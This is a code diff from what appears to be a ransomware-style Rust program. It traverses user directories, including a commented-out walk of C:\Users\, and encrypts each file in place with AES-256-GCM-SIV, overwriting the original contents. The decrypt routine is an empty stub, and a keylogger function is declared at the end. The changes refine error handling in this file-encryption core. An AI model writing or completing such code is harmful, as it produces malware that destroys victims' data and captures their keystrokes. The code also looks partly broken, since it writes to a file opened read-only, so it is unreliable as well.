@@ -187,10 +187,12 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
                     "found file: {}",
                     entry.path().display()
                 );
+                //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
+                //FIXME: herererer
                 if do_encrypt {
-                    encrypt(entry.path(), cipher);
+                    encrypt(entry.path(), cipher)?;
                 } else {
-                    decrypt(entry.path(), cipher);
+                    decrypt(entry.path(), cipher)?;
                 }
             }
             Err(e) => {
@@ -199,17 +201,36 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
         }
     }
     Ok(())
+
+    // let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
+
+    // for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
+    //     match entry {
+    //         Ok(entry) => {
+    //             writeln!(
+    //                 //this is just debug code
+    //                 file.as_ref().unwrap(),
+    //                 "found file: {}",
+    //                 entry.path().display()
+    //             );
+    //             // encrypt(entry.path());
+    //         }
+    //         Err(e) => {
+    //             writeln!(file.as_ref().unwrap(), "Error: {}", e);
+    //         }
+    //     }
+    // }
+    // Ok(())
 }
 
 /**
  * Encrypt a file, using given path and the same key for all files
  * Use different nonce for each file, prepend to file
  */
-fn encrypt(path: &Path, cipher: &Aes256GcmSiv) {
-    let mut file = File::open(path).expect("can't open file");
+fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> std::io::Result<()> {
+    let mut file = File::open(path)?;
     let mut buffer = Vec::new();
-    file.read_to_end(&mut buffer)
-        .expect("can't load file contents");
+    file.read_to_end(&mut buffer)?;
 
     //TODO: make a nonce, use it, append to the beginning or end of file
     let mut rng = ChaCha20Rng::from_entropy();
@@ -220,13 +241,15 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) {
     //put the ciphertext bac into the file
     file.set_len(0);
     file.write_all(&ciphertext.unwrap().as_slice());
+    Ok(())
 }
 
 /**
  * Decrypt a file using a given key
  */
-fn decrypt(path: &Path, cipher: &Aes256GcmSiv) {
+fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     //
+    Ok(())
 }
 
 fn keylogger() {
